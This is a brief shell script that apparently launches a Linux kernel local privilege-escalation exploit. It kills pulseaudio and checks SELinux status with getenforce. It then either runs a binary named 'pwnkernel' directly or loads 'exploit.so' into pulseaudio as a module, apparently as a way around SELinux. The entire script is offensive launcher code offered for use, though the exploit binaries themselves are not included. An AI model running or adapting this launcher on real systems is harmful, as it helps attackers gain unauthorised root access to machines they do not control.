#!/bin/sh

killall -9 pulseaudio
if [ ! -f '/usr/sbin/getenforce' ]; then
  ./pwnkernel
else
  RESULT=`/usr/sbin/getenforce`
  if [ "$RESULT" != "Disabled" ]; then
    pulseaudio --log-level=0 -L /home/spender/exploit.so
  else
    ./pwnkernel
  fi
fi
